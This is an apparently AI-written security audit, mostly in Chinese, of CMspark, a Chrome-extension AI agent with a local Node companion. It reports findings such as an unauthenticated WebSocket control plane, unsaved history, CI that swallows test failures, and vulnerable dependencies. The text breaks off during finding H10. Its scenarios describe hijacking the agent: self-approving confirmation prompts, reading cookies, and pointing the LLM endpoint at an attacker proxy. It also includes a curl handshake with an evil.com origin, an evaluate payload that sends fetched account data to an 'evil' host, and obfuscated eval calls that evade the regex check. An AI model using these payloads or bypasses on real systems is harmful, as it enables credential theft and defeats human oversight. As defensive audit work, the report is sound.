# Fuck My Shit Mountain Audit Report

**Project:** CMspark — 浏览器内 AI Agent（Chrome Extension + 本地 Companion）
**Audit mode:** full（全 25 维度）
**Date:** 2026-07-09
**Reviewer:** Claude Code（Fuck My Shit Mountain skill, full mode）
**Commit:** `8de4b0a`（main, clean tree）
**Scope:** 全项目第一方源码（companion + chrome-extension + scripts + docs + CI）。排除 `node_modules`/`build`/`dist`/`.plasmo`/`.test-dist`/`dist-package` 二进制与生成物。

---

## 1. Executive Summary

CMspark 是一个工程思考相当成熟的项目：双层拓扑清晰、9 篇 ADR 决策记录详实、安全设计有真材实料（HMAC 常量时间比较、origin 绑定的确认队列、域白名单 + 通配符语义、SSRF/路径穿越防护、历史库脱敏、掩码 API key 往返、systray2 二进制 SHA256 校验进 CI）。代码注释诚实（多处标注已知残余风险），companion 的 `tsc --noEmit` 干净，单元测试（config 17/17、page-sanitizer、security-policy）测试的是真实行为而非 mock。这些是真实的亮点。

但项目**不具备稳定公开发布的条件**。审计发现 **4 个 Critical、10 个 High**，且高度集中在三个承重墙上：

1. **信任根缺失** — WebSocket 服务器（`ws://127.0.0.1:23401`，整个系统的控制面）**完全没有鉴权**：无 `verifyClient`、无 Origin 校验、无握手密钥。任何本地进程，以及用户 merely 访问的恶意网页（浏览器允许页面发起 loopback WebSocket），都能连上并驱动 agent —— 调用 `list_all_cookies` 倾倒全浏览器 cookie、自批准 `evaluate` 确认。这让精心构建的确认/白名单/token 体系在信任根处形同虚设。

2. **审计数据永不落盘** — `history.db` 用 sql.js（纯 WASM，全库在内存）。`record()` 只做内存 INSERT **不 flush**；`save()` 只在开机 `init()` 调用一次；`close()` **在 shutdown 路径中从未被调用**（直接读 `server.ts:1522` 确认）。结果：**每次正常 SIGTERM/SIGINT 关闭都丢失本次会话全部操作记录**。

3. **CI 永久绿-on-red** — CI 末步 `npm test || true` 同时吞掉了测试失败和 hang。直接运行发现：安全闸门集成测试（`security-gates.test.js`）有 5+ 个用例失败且进程无限挂起。主分支上**安全确认机制的关键测试是静默红色的**。

供应链层面 companion 有 **2 个 Critical npm 漏洞**（`decompress` zip-slip 经 `officeparser` 命中用户上传文件路径 + 另一个），chrome-extension 构建链有 **67 个 High**。发布的 DMG/exe **无代码签名/公证/SBOM**，Node 运行时经 `curl` 下载**无 SHA256 校验**。

**亮点不该被掩盖**：安全工程的许多细节做得扎实；问题不是"写得烂"，而是**三个承重墙在发布前必须补上**，外加一批可快速修复的高价值项（config.json 权限 15 分钟、evaluate token 校验 30 分钟、移除 `|| true` 半天）。

### Score Dashboard

```
Security        ████░░░░░░  3.5  C   WS 控制面零鉴权(根因)，config.json 0644，2 个 critical 依赖漏洞
Stability       ████░░░░░░  3.5  C   history.db 从不落盘(Critical)，非原子写，saveConfig 竞态，shutdown 不 flush
Performance     ██████░░░░  6.0  B   无虚拟化/每 token 全量重渲染/无 LLM 并发与成本预算；单用户负载下多为潜伏
Testing         ████░░░░░░  3.5  C   CI `|| true` 永久吞失败+hang；5 个安全闸门测试静默红；无组件/e2e 测试
Maintainability ██████░░░░  6.0  B   App.tsx 1104/useWebSocket 450 巨型文件；any 协议边界；但 ADR/注释质量高
Design          ██████░░░░  5.5  B   god-file 违 SRP；config/history 静默降级违 fail-fast；saveConfig 违 CQS
Release         ███░░░░░░░  3.0  C   无签名/公证/SBOM，Node 下载未校验，版本不齐，无 health/日志轮转
─────────────────────────────────────
Overall         ████░░░░░░  4.4  C
```

每维度 0.0–10.0。**分越高越好（10=干净，0=shit mountain）**。评分基于工程判断而非机械扣分。

### Finding Statistics

| Severity | Count | Confirmed | Suspected |
|----------|-------|-----------|-----------|
| Critical | 4 | 4 | 0 |
| High | 10 | 10 | 0 |
| Medium | 22 | 18 | 4 |
| Low | 16 | 13 | 3 |
| Info | 3 | 3 | 0 |
| **Total** | **55** | **48** | **7** |

---

## 2. Project Map

**拓扑**：Chrome Extension (Plasmo + React MV3, Side Panel 320px + Service Worker) ↔ WebSocket `ws://127.0.0.1:23401` ↔ Companion (Node.js + TypeScript)。

**入口与初始化**：Companion `index.ts` → `startServer()`（`server.ts`）：`initServices()`（threadManager/skillEngine/historyStore 单例 boot 时 await 一次）→ `mcpManager.start()` → `new WebSocketServer({host:"127.0.0.1"})` → SIGINT/SIGTERM → `shutdown()`。Extension `background/index.ts`（SW）→ `ws-client.ts` 连 companion → 30s ping → Side Panel `App.tsx` ↔ `agentStore` ↔ `useWebSocket` ↔ `chrome.runtime.sendMessage` ↔ SW ↔ WS。

**数据流（agent 回路）**：用户输入 → Side Panel → SW → WS → Companion `message-router` → `llm/adapter`（OpenAI 兼容流式 + tool_call）→ `createToolExecutor`（安全闸门：域白名单/确认/token）→ `tool.execute` 经 WS 回 SW → `browser-bridge`（CDP/tabs/cookies/debugger）或 `executeCompanionTool`（osascript/skill）→ `tool.result` → adapter 下一轮 → `MAX_TOOL_CALL_ROUNDS=100` 封顶。

**状态归属**：线程/消息 `threads/thread-manager.ts`（每线程 `<id>.json`，append，非原子）；配置 `config.ts` 单例 + `config.json`（0644，非原子，无 schema）；历史 `history/store.ts` sql.js 全内存（0o600，但仅 boot save 一次）；MCP `mcp/manager.ts` 子进程池 + per-session 确认缓存；前端 `agentStore`+`useWebSocket`+SW 三处连接状态。

**持久化层**：JSON 文件（config/threads/index/obsidian）+ sql.js history.db + JSONL 日志（无轮转）。**全部非原子写**（除 `menu-bar-agent.ts` STATUS_FILE）。

**隐私敏感数据**：API key（config.json + chrome.storage.local）、cookie 值（trusted_domains 门控但扩展端直传）、页面文本（page-sanitizer ~11 正则后入 LLM）、历史库脱敏后元数据、Obsidian vault 档案。

**外部接口**：WS（控制面，loopback 无鉴权）、settings-web HTTP（已补 Host/Origin/token/SSRF 四重门）、LLM API（DeepSeek 默认）、MCP stdio/http 子进程、CDP、osascript（宿主 shell）。

**AI/LLM 面**：`llm/adapter.ts` 流式 + tool loop + 越狱输出检测；`llm-extract.ts` 结构化抽取；skill TF-IDF+余弦；**无 token/cost 预算、无并发上限**。

**安全边界**：①cookie trusted_domains 通配符门（companion）②evaluate/osascript_eval 默认阻断走确认（45s 超时，origin 绑定 ws）③navigate/create_tab/set_tab_url scheme+hostname 门 ④auto_approved_domains + 全局 `auto_approve_dangerous` ⑤HMAC token 常量时间校验 ⑥page-sanitizer（扩展 ~11 模式）⑦settings-web 四重门。**承重缺口：WS 连接本身无鉴权**（边界①–⑥ 都假设 peer 是合法扩展）。

**测试**：39 文件（companion 34 + extension 5），`node --test`。CI 仅 `cd companion && npm test || true`，且只 build/test companion。

**发布**：esbuild bundle `cmspark-agent.js`(18M) + universal `node`(111M) + Swift tray + `sql-wasm.wasm` → DMG/exe。无签名；Node 经 curl 下载无校验。版本 companion 0.2.0 / extension 0.1.0，无 tag/changelog。

### Coverage Matrix

| Dimension | Coverage | Evidence inspected | Exclusions / limits |
|-----------|----------|--------------------|---------------------|
| Architecture | High | server.ts/message-router.ts/adapter.ts/browser-bridge.ts/App.tsx 全读；ADR-001~009 | 未跑运行时追踪 |
| Security | High | security*.ts、tool-definitions、message-router 闸门、browser-bridge、page-sanitizer、config.ts、server.ts:1287/1522 直接复核 | 未做动态攻击 PoC |
| Stability | High | history/store.ts:215-321、server.ts shutdown、daemon.ts、mcp/manager.ts、adapter 重试、index.ts 进程 handler | 未跑长时压力 |
| Performance | Medium | App.tsx/ChatView/useWebSocket 渲染路径、adapter 消息重建、store export、bundle chunk | 无 profiling，单用户负载未实测 |
| Testing | High | ci.yml、39 测试文件采样 6、直接跑 npm test 复现 hang | 未逐文件审计真实性 |
| Maintainability | High | 全 >500 行文件、agentStore、协议 any 统计、docs | — |
| Design | High | 巨型文件、fallback 路径、CQS 违例点 | — |
| Release | High | ci.yml、package.sh/create-dmg.sh/build-windows-exe.ps1、verify-systray2.js、dist-package | 未实际执行签名 |
| Documentation | Medium | docs/*、9 ADR、audit-report-2026-06-05、diagnosis-2026-06-23 | 未逐链接校验 |
| Observability | Medium | logger.ts、server.ts 日志点、settings-web /api/health | 无 metrics 基线 |
| Configuration | High | config.ts 全读、settings-cli/web、masked key 逻辑 | — |
| Data-Integrity | High | store.ts、thread-manager 写路径、saveConfig | 未运行时崩溃注入 |
| Privacy | Medium | history 脱敏、logger SENSITIVE_KEY_RE、page-sanitizer、obsidian 档案、analyze_image | 未审计 provider 侧 |
| Accessibility | Medium | SecurityConfirmationDialog、各 modal、ChatView | 未跑 axe/Playwright |
| Supply-Chain | High | npm audit（复核）、lockfile、verify-systray2.js、package.sh | 未做 SBOM/cosign |
| Cost | Medium | adapter（无 usage/预算/并发）、context_window=1e6、MAX_TOOL_CALL_ROUNDS=100 | 无真实账单 |
| AI-Safety | High | adapter 注入面、page-sanitizer、tool 授权闸门、osascript、越狱检测 | 无 eval 基线 |
| Fallback | Medium | config/history/adapter catch、mcp catch(()=>{})、unhandledRejection | — |
| Testing-Authenticity | Medium | 采样 6 测试文件 | 未全量审计 39 |
| Type-Safety | High | tsconfig、tsc --noEmit（companion 0 错；extension 9 错）、any 统计 | — |
| Frontend-State | High | App.tsx/useWebSocket/agentStore/ChatView/BottomBar/各 modal | 未运行时验证竞态 |
| Backend-API | Medium | validateWsMessage、message-router handler、settings-web | WS 消息协议非 REST |
| Dependency-Weight | Medium | package.json 双份、bundle chunk、mermaid/katex/sql.js | 未跑 madge |
| Code-Consistency | Medium | 错误处理/catch/命名跨文件采样 | 未跑 eslint 全量 |
| Comment-Coverage | Low | 抽样关键文件注释密度 | 未全量统计 |

---

## 3. Top Risks

| # | Finding | Sev | 一句话 |
|---|---------|-----|--------|
| C1 | WS 服务器无鉴权（根因） | Critical | `server.ts:1287` 无 verifyClient/Origin/握手；任何本地进程或恶意网页可连接并驱动 agent |
| C2 | history.db 永不落盘 | Critical | `record()` 不 flush、`close()` 在 shutdown 从不调用 → 每次正常关闭丢失本次会话全部审计记录 |
| C3 | CI 永久绿-on-red | Critical | `ci.yml:46` `npm test \|\| true` 吞掉失败+hang；安全闸门集成测试在 main 上静默红 |
| C4 | 2 个 Critical npm 漏洞 | Critical | `decompress` zip-slip 经 officeparser 命中用户上传文件路径；+1 critical |
| H1 | config.json mode 0644 | High | 写未带 mode → API key 在多用户/共享主机 world-readable（live ls 确认） |
| H2 | evaluate token 颁而不校 | High | 转发 evaluate 到扩展时从不 validateToken，确认与执行的代码绑定断裂 |
| H3 | 配置/线程 JSON 非原子写 | High | 直接 writeFileSync 覆盖 → 崩溃留截断 JSON → 静默数据丢失 |
| H4 | config 无 schema，损坏静默回默认 | High | catch 后直接默认 → 丢 API key + trusted_domains，无日志 |
| H5 | saveConfig 读-改-写竞态 | High | 无锁非原子；白名单添加与设置保存并发可静默丢失 |
| H6 | chrome-extension 67 High 漏洞 | High | plasmo→parcel/svelte 传递依赖 |
| H7 | 扩展带 9 个 tsc 错发布 | High | browser-bridge CDP/injection 路径 as Object；plasmo build 忽略 tsc |
| H8 | 无签名/公证/SBOM，Node 下载未校验 | High | `<all_urls>`+宿主 shell 的工具发未签名二进制 |
| H9 | evaluate 扩展端零门 + 正则可绕 | High | bracket-notation 绕过；扩展层不 gate，全靠 companion 确认 |
| H10 | 安全确认弹窗无 focus trap/Escape | High | 承重安全控制不满足键盘可达；盲用户可能误按"允许" |

---

## 4. Detailed Findings

> 全部发现按 issue-card 模板。`[executed]`=已运行验证，`[inspected]`=静态读码，`[assumed]`=文档/模式推断。Critical/High 详述；Medium/Low 字段完整但精简。

### Finding: C1 WS 服务器无鉴权 — 任何本地进程/网页可连接并驱动 agent（根因）
- Severity: Critical
- Confidence: High
- Category: Security
- Status: Confirmed
- Affected area: companion WS 控制面（server.ts）
- Evidence:
  - File: `companion/src/server.ts:1287`、`:1323-1335`、`:1350+`
  - Function/Module: `startServer()` / `wss.on("connection")` / `ws.on("message")`
  - Behavior: `new WebSocketServer({ port, host: "127.0.0.1" })` 无 `verifyClient`；connection 处理器立即 `clients.add(ws)` + `createToolExecutor(ws)`；首条消息仅过 `validateWsMessage` 形状校验即分发。关键路径 `grep verifyClient|Origin` = 0。
- Problem: loopback 是缓解不是边界。本地进程零摩擦连接；浏览器**仅 HTTP 页面**可向 loopback 发 WS（**HTTPS 页面被 Mixed Content 策略拦截** `ws:` 非安全子资源——网页向量真实但窗口窄）；用户访问 HTTP evil 页或任何本地恶意进程即可被驱动浏览器、倾倒 cookie、自批准 evaluate，甚至改写 LLM `base_url`/`api_key` 把对话流量重定向到攻击者代理。
- Why it matters: 信任根。整个确认/白名单/token 体系假设 peer 是合法扩展；无握手则假设未强制。`config.set`（message-router.ts:68）可被任意连接者调用，改 `trusted_domains`/`auto_approve_dangerous`/LLM `base_url`/`api_key`——后者是完整的会话劫持/数据渗漏路径（比单纯跑 evaluate 更隐蔽）。多数其他发现可被利用的根。
- Realistic failure scenario: (a) 本地恶意进程（或用户访问的 HTTP 页）连 `ws://127.0.0.1:23401` → `config.set` 把 `auto_approve_dangerous:true` + `trusted_domains:["*"]` → 随后 `evaluate`/`list_all_cookies` 无提示执行；(b) 更隐蔽：`config.set` 改 LLM `base_url` 指向攻击者代理 → 用户后续所有对话（含历史）原样转发给攻击者。Kimi 实测 `curl -H "Origin: https://evil.com"` 握手成功（ws 默认不查 Origin）。
- Minimal fix: 加 `verifyClient` 要求 Origin 匹配 `chrome-extension://<id>`（关闭网页向量，~30 分钟），再叠一次性共享密钥握手。
- Better long-term fix: Origin + 共享密钥 + 消息级 HMAC（复用 security-policy token 机制）。
- Regression test suggestion: 单元 `verifyClient` 拒 `Origin: https://evil.com`；集成裸 `ws.connect()` 无握手不能 `config.set`。
- Estimated effort: 2–4 小时。

### Finding: C2 history.db 永不落盘 — 每次正常关闭丢失本次会话全部审计记录
- Severity: Critical
- Confidence: High
- Category: Stability
- Status: Confirmed
- Affected area: companion history 子系统 + shutdown 路径
- Evidence:
  - File: `companion/src/history/store.ts:300-321`、`:263-280`、`:223-239`、`:377`；`companion/src/server.ts:1522-1536`
  - Function/Module: `HistoryStore.record/save/close`、`shutdown`
  - Behavior: `record()` 仅 `this.db.run(INSERT)` 无 `save()`；`save()` 仅在 `init()`（boot 一次）与 `close()`；`close()` 在 SIGINT/SIGTERM 的 `shutdown()` 中从未调用（直接读确认 `mcpManager.shutdown().finally(()=>{wss.close();releaseLock();process.exit(0)})`）。sql.js 全内存，磁盘文件仅反映 boot 状态。
- Problem: 历史子系统名义 30 天审计留存，实际从不在正常路径持久化。
- Why it matters: 正常操作下数据丢失（severity Critical）。审计/取证面整体缺口。
- Realistic failure scenario: 任何正常关闭（托盘停 daemon、Ctrl+C、launchd 重载）→ 本次会话全部操作记录消失。
- Minimal fix: `record()` 末尾 `save()`（原子 tmp+rename）；`shutdown()` 前 `await historyStore.waitReady(); historyStore.close()`。
- Better long-term fix: 迁移 `better-sqlite3`（原生 WAL，无需 export）。
- Regression test suggestion: record 10 条 → SIGKILL → 重开 db 断言（当前 0=bug；修复后 10）。
- Estimated effort: 1 小时。

### Finding: C3 CI 永久绿-on-red — 安全闸门集成测试在 main 上静默失败
- Severity: Critical
- Confidence: High
- Category: Testing
- Status: Confirmed
- Affected area: `.github/workflows/ci.yml` + integration tests
- Evidence:
  - File: `.github/workflows/ci.yml:46`（`cd companion && npm test || true`）；`tests/integration/security-gates.test.js:135`
  - Function/Module: CI test 步、`SecurityConfirmationManager` 集成
  - Behavior: 实测 `timeout 120 npm test` → security-gates 报 5+ `timeout waiting for security.confirmation.request`，随后进程因未清理 WebSocketServer/WebSocket/setTimeout 句柄无限挂起至超时；node:test 报 "Promise resolution is still pending"。`|| true` 同时吞失败与 hang。
- Problem: 主安全机制（确认闸门）有失败测试无人看见。5 个白名单反注入/非信任域确认用例在 main 红。
- Why it matters: 确认闸门是承重人机回路控制。其回归零信号上线。
- Realistic failure scenario: 重构 SecurityConfirmationManager，白名单路径坏，5 测试本可捕获，CI 报绿，恶意页自动批准静默上线。
- Minimal fix: 移除 `|| true`；`security-gates.test.ts` 的 `after()` 关 wss/clientSideWs 并清 setTimeout（helper timer 从未 unref）；security-policy/daemon-cli 同样修 teardown。
- Better long-term fix: CI matrix 加 mac/win；extension 加 build+tsc 步。
- Regression test suggestion: CI 步 `node --test --test-reporter=tap .test-dist/tests/integration/security-gates.test.js` 必须 60s 内 exit 0。
- Estimated effort: 0.5 天。

### Finding: C4 供应链 — companion 运行时 2 Critical + 1 High npm 漏洞
- Severity: Critical
- Confidence: High
- Category: Supply-Chain
- Status: Confirmed
- Affected area: companion 依赖（officeparser/openai 传递）
- Evidence:
  - File: `companion/package.json`；`npm audit` 输出
  - Function/Module: officeparser（用户文件解析）、openai SDK（出站 LLM）
  - Behavior: `cd companion && npm audit` → 9 漏洞（2 critical/1 high/5 mod/1 low）。`decompress@4.2.1` critical（GHSA-mp2f-45pm-3cg9 zip-slip，经 `officeparser@4.2.0`，Kimi 复核确认版本）；`form-data 4.0.0-4.0.5` high（CRLF 注入，经 openai）；+1 critical；js-yaml/uuid/file-type/esbuild 等。命中 `file-parser.ts:173` `officeparser.parseOfficeAsync` 用户上传 office 文件路径。
- Problem: critical zip-slip 在用户上传文件处理路径（非 dev 依赖）；form-data 在出站 LLM 路径。
- Why it matters: 「已知漏洞+生产使用+公开 exploit」=Critical。crafted office 文档可写穿 `~/.cmspark-agent/`。
- Realistic failure scenario: 攻击者发 agent 一个 zip-slip office 文档 → companion 经 officeparser/decompress 解压 → 文件落到 builtin-skills/ 覆盖安全 skill 或落启动路径。
- Minimal fix: `npm audit fix` 解 form-data/js-yaml；decompress 升 officeparser 7.x 或换 yauzl+entry 校验；加 CI `npm audit --audit-level=high` 门。
- Better long-term fix: SBOM + dependabot/renovate 自动 PR。
- Regression test suggestion: 喂 zip-slip PoC office 文档，断言 sandbox 外无写入。
- Estimated effort: 1 天。

### Finding: H1 config.json mode 0644 — API key world-readable
- Severity: High
- Confidence: High
- Category: Security
- Status: Confirmed
- Affected area: companion config 落盘
- Evidence:
  - File: `companion/src/config.ts:171`、`:355`
  - Function/Module: `initDataDir()`、`saveConfig()`
  - Behavior: 两处 `fs.writeFileSync(configPath, …)` 无 `mode` → process umask（典型 0644）。实测 `ls -la ~/.cmspark-agent/config.json` = `-rw-r--r--`，含真实 sk- key。对比 history/store.ts:275 正确用 0o600。
- Problem: 多用户/共享主机/开文件共享的 mac 任何本地用户可 cat 读 api_key/vision_api_key。近期提交修了传输掩码未修落盘权限。
- Why it matters: 攻击者读文件而非 WS，所有 WS 掩码失效。
- Realistic failure scenario: 多用户服务器第二账户 cat config.json 拿到 key，盗刷或经 LLM 外泄。
- Minimal fix: 两处加 `{mode:0o600}`；initDataDir 对已存文件 `chmodSync(configPath,0o600)`。
- Better long-term fix: 同步修 logger.ts:91（M7）文件 0o600。
- Regression test suggestion: saveConfig 后断言 `mode & 0o777 === 0o600`；已存 0644 经 initDataDir 后 0600。
- Estimated effort: 15 分钟。

### Finding: H2 evaluate 安全 token 颁而不校
- Severity: High
- Confidence: High
- Category: Security
- Status: Confirmed
- Affected area: companion tool executor（evaluate 路径）
- Evidence:
  - File: `companion/src/server.ts:221-308`、`:397-437`
  - Function/Module: `createToolExecutor`、`executeCompanionTool`
  - Behavior: evaluate 确认后 `securityPolicy.issueToken("evaluate",code)` 塞 finalParams.security_token 并 ws.send 转发；executeCompanionTool 只处理 osascript_eval/use_skill/record_experience。`grep validateToken.*evaluate` 仅命中 osascript_eval，evaluate 从不校验。
- Problem: token 本用于绑定"批准的代码"与"执行的代码"，evaluate 在执行边界（扩展）从不复查。被入侵扩展或恶意 peer（C1）可确认后篡改 code 或重放。
- Why it matters: evaluate 在用户真实 Chrome 会话跑任意 JS（读 cookie/localStorage/认证 API）。token 当可选破坏人机回路保证。
- Realistic failure scenario: 恶意 peer（C1）连入诱导 evaluate，同 socket 自批准，转发 code 实为 `fetch('/api/me').then(t=>new Image().src='//evil?'+t)`，无人复查。
- Minimal fix: createToolExecutor 中 evaluate 的 security_token 非空时调 validateToken(token,"evaluate",code)，失配返错（镜像 server.ts:711-715 osascript）。
- Better long-term fix: 配合 C1 关闭自批准向量。
- Regression test suggestion: code A 签 token；code B+同 token 调 executor；断言拒绝。
- Estimated effort: 30 分钟。

### Finding: H3 配置/线程/索引 JSON 全部非原子写
- Severity: High
- Confidence: High
- Category: Stability
- Status: Confirmed
- Affected area: config + threads 持久化
- Evidence:
  - File: `companion/src/config.ts:355`；`companion/src/threads/thread-manager.ts:118/184/299/318/340`
  - Function/Module: `saveConfig`、`saveIndex`、`createMessagesFile`、`addMessage`、`updateMessage`、`deleteMessagesFrom`
  - Behavior: 均直接 `writeFileSync` 覆盖，无 tmp+rename。对比 menu-bar-agent.ts:158-160 STATUS_FILE 用了原子写。
- Problem: 崩溃/断电/盘满中途留截断 JSON。boot 时 config.ts:200 catch 回默认（丢 key+域）；thread-manager loadIndex 回 {threads:[]}（线程列表空，per-thread 成孤儿）；addMessage catch 回 {messages:[]}（整段对话空）。
- Why it matters: 最可能的真实数据丢失向量。合盖断电于 addMessage 写中途 → 线程没了。
- Realistic failure scenario: 用户正聊天（每消息触发 addMessage 写），合盖断电中途 → 重开线程空。
- Minimal fix: 抽 atomicWriteJSON(path,data)（writeFileSync(tmp);renameSync(tmp,target)），应用于 6 个调用点 + initDataDir 默认配置写。
- Better long-term fix: 配合 H4 加 zod 校验 + corrupt 文件保留。
- Regression test suggestion: SIGKILL 于 addMessage 两写之间 → 重开断言文件可解析且为上一好状态。
- Estimated effort: 2–3 小时。

### Finding: H4 config 无 schema — 损坏静默回默认
- Severity: High
- Confidence: High
- Category: Configuration
- Status: Confirmed
- Affected area: companion config 加载
- Evidence:
  - File: `companion/src/config.ts:196-202`、`:361`
  - Function/Module: load 配置、`deepMerge`
  - Behavior: `try{JSON.parse→deepMerge}catch{cachedConfig={...defaultConfig}}`。无 zod（尽管是依赖），无 version，deepMerge 无类型(any)。TROUBLESHOOTING 记恢复法 `rm config.json`（销毁 trusted_domains 等）。与 H3 叠加。
- Problem: 单坏字节 → 静默回 deepseek-v4-flash（不存在，M19）+ 空 trusted_domains + auto_approve_dangerous:false，API key/域白名单消失无日志，companion 继续默认跑。
- Why it matters: rubric 9.2「必需配置静默默认」=Critical；此处评 High（key 可重填，与 H3 同源）。fail-fast 缺失+数据丢失。
- Realistic failure scenario: 崩溃中途 config 截断 → 下次启动静默默认 → 丢 key+域+obsidian 档案。
- Minimal fix: zod schema load 校验；失败改名 config.json.corrupt-<ts> 并 logger.error；原子写（H3）；加 config_version。
- Better long-term fix: 前向迁移 runner。
- Regression test suggestion: 喂截断 config 断言 logger.error 触发 + .corrupt-* 保留 + 新默认。
- Estimated effort: 0.5 天。

### Finding: H5 saveConfig 非原子读-改-写竞态
- Severity: High
- Confidence: High
- Category: Stability
- Status: Confirmed
- Affected area: companion config 写路径
- Evidence:
  - File: `companion/src/config.ts:305/355`
  - Function/Module: `saveConfig`
  - Behavior: 读 getConfig()（缓存）→ deepMerge → writeFileSync。竞态调用点：message-router.ts:125/238/1188、server.ts:613（whitelist add）、settings-web.ts:383。两并发 caller 各读 v1、merge、写，A 被静默覆盖。
- Problem: 第二写者 current 设计上过期。无锁/CAS/原子 rename。具体：handleSecurityConfirmationResponse 点"加白名单"后 saveConfig({auto_approved_domains:[...current,...new]})，若同时另一面板 settings.set，白名单添加丢失。
- Why it matters: 安全相关配置（auto_approved_domains）丢失=用户安全意图被静默忽略。
- Realistic failure scenario: 用户确认加白名单 + 同时另一实例保存设置 → 白名单条目丢。
- Minimal fix: 单 promise 队列串行化读-改-写；磁盘写原子（H3）。
- Better long-term fix: compare-and-swap by version。
- Regression test suggestion: 两并发 saveConfig 写不相交 key → 重开断言都在。
- Estimated effort: 2 小时。

### Finding: H6 chrome-extension 构建链 67 High npm 漏洞
- Severity: High
- Confidence: High
- Category: Supply-Chain
- Status: Confirmed
- Affected area: chrome-extension 依赖（plasmo/parcel/svelte）
- Evidence:
  - File: `chrome-extension/package.json`；`npm audit` 输出
  - Function/Module: plasmo 构建链
  - Behavior: `cd chrome-extension && npm audit` → 73 漏洞（67 high）。@parcel/*（经 @plasmohq/parcel-core）+ svelte<=5.55.6（8 XSS advisory）。`npm audit fix --force` 会降 plasmo 0.90.5→0.50.1（breaking）。
- Problem: plasmo 钉了多 RCE/SSRF/穿越的 Parcel 版本；svelte 传递含 8 XSS；dev-server Parcel CVE 允许 plasmo dev 任意文件读。
- Why it matters: 构建期风险较低（Parcel 不进 bundle），但 dev-server CVE 在开发者跑 dev 时触发；svelte XSS 可影响工具链任意 svelte 组件。
- Realistic failure scenario: 开发者 npm run dev；恶意本地依赖或访问页触发 Parcel dev-server 文件读。
- Minimal fix: 跟上游等 Parcel bump；分支测 npm audit fix --force 量破坏面；用 package.json overrides 钉可补丁最高版。
- Better long-term fix: 评估 plasmo 替代（wxt/crxjs）若上游停滞。
- Regression test suggestion: CI 步 npm audit --audit-level=high（先 informational）再收紧。
- Estimated effort: 2–3 天。

### Finding: H7 扩展带 9 个 TypeScript 错发布
- Severity: High
- Confidence: High
- Category: Type-Safety
- Status: Confirmed
- Affected area: chrome-extension background（CDP/injection 路径）
- Evidence:
  - File: `chrome-extension/src/background/browser-bridge.ts:199/211/212/215/247/270/895/898`、`background/index.ts:74`
  - Function/Module: CDP 结果处理、executeScript
  - Behavior: `npx tsc --noEmit` → 9 错（Property root/nodeId/outerHTML 不存在于 Object；InjectionResult<any> 无 error）。但 build/chrome-mv3-prod/manifest.json 存在——plasmo build 成功忽略 tsc。
- Problem: 发布物来自项目自身 tsc 拒绝的代码。browser-bridge 是 CDP/injection 边界，无类型 Object 访问恰在缺字段会静默失败处。
- Why it matters: 类型错在安全敏感注入路径。发布物偏离类型源。
- Realistic failure scenario: CDP attach/executeScript 返回意外形状，as Object 读 .nodeId(undefined) 传下去，下游 tool 操作错节点。
- Minimal fix: 为 CDP 结果定义接口（DomNode/InjectionResult<T>）；CI 加 `cd chrome-extension && tsc --noEmit` 门。
- Better long-term fix: strict tsconfig（noImplicitAny/strictNullChecks 已查）。
- Regression test suggestion: CI 步 tsc --noEmit 必过。
- Estimated effort: 0.5 天。

### Finding: H8 无签名/公证/SBOM；Node 经 curl 下载无校验
- Severity: High
- Confidence: High
- Category: Release
- Status: Confirmed
- Affected area: 发布管线（scripts/）
- Evidence:
  - File: `scripts/build-windows-exe.ps1:136-143`、`scripts/create-dmg.sh`、`scripts/package.sh:167/177`
  - Function/Module: 打包/签名/Node 下载
  - Behavior: signtool 仅 remove 已有签名不签新 exe；create-dmg 无 codesign/notarytool；package.sh `curl -fSL "${NODE_MIRROR}/..."` 无 sha256/gpg，NODE_MIRROR 可被 env 覆盖；无 SBOM/CHANGELOG/tag/Releases。
- Problem: 分发 DMG/exe 未签名（Gatekeeper/SmartScreen 警告）+ 由未校验 Node 下载构建（供应链篡改）+ 不可复现。
- Why it matters: 对注入每页 + 跑宿主 shell 的工具，发未签名二进制是显著信任缺口。nodejs.org MITM 或被毒 NODE_MIRROR → 后门 runner。
- Realistic failure scenario: 构建主机 NODE_MIRROR 指向投毒镜像 → trojaned node 首跑外泄 config.json。
- Minimal fix: package.sh 从 SHASUMS256.txt pin+校验 Node（+PGP）；macOS codesign+notarytool；Windows signtool sign；SBOM（cyclonedx-npm）；打 tag。
- Better long-term fix: SLSA 来源 + reproducible build。
- Regression test suggestion: CI 步断言 SHASUMS 校验已跑；release workflow codesign/notary 非 0 即失败。
- Estimated effort: 2–5 天（证书是长杆）。

### Finding: H9 evaluate 扩展端零门 + 正则黑名单可绕
- Severity: High
- Confidence: High
- Category: Security
- Status: Confirmed
- Affected area: chrome-extension browser-bridge（evaluate）
- Evidence:
  - File: `chrome-extension/src/background/browser-bridge.ts:855-888`、`:47-53`、`:13-45`
  - Function/Module: `evaluate`、`detectDangerousApis`、`DANGEROUS_API_PATTERNS`
  - Behavior: `if(matches.length>0)` 块空 stub（注释"extension does not gate evaluate"），无条件 safeEvaluate。保留的 regex 匹配字面 token，故 window["ev"+"al"]/globalThis.eval/(0,eval)/Reflect.apply/模板串 均绕 \beval\s*\(。
- Problem: 扩展做零门——任何来自被入侵/恶意 peer 的 evaluate 立即执行。正则提示提供虚假保证。配合 <all_urls> + MAIN world 注入，companion 被入侵或 C1 恶意 peer 接入即对每 tab（含银行）全 RCE。
- Why it matters: 扩展是特权边界。正则"提示"读起来像控制却非控制。
- Realistic failure scenario: LLM 或恶意 peer 发 evaluate({tabId:银行, code:"fetch('/api/account',{credentials:'include'}).then(...)})；bracket-notation fetch 绕正则；扩展执行。
- Minimal fix: 扩展端别维护正则提示（明确文档 advisory-only）；若要真 gate 用 AST（acorn）拒 callee 解析为 eval/Function/Reflect 的 CallExpression。
- Better long-term fix: 配合 H2（companion validateToken）+ C1。
- Regression test suggestion: detectDangerousApis("window['ev'+'al']('x')") 今日返[]；修复后返["eval"]。
- Estimated effort: 0.5 天（删提示+文档）或 2–3 天（真 AST 门）。

### Finding: H10 安全确认弹窗无 focus trap/Escape/a11y
- Severity: High
- Confidence: High
- Category: Accessibility
- Status: Confirmed
- Affected area: sidepanel SecurityConfirmationDialog
- Evidence:
  - File: `chrome-extension/src/sidepanel/App.tsx:125-248`
  - Function/Module: `SecurityConfirmationDialog`
  - Behavior: overlay(zIndex:120)+三按钮+三 radio，但无任何 autoFocus、无 Escape、无 role="dialog"/aria-modal/aria-labelledby、无 focus trap（Tab 漏到背后）、radio 无 fieldset/legend。
- Problem: 弹窗 gate evaluate/osascript_eval 执行。键盘用户无法可靠驱动：Tab 漏到背后；Escape 无效；首次 Tab 落点不可预测。屏读不播报 modal。45s 超时下屏读用户可能超时。
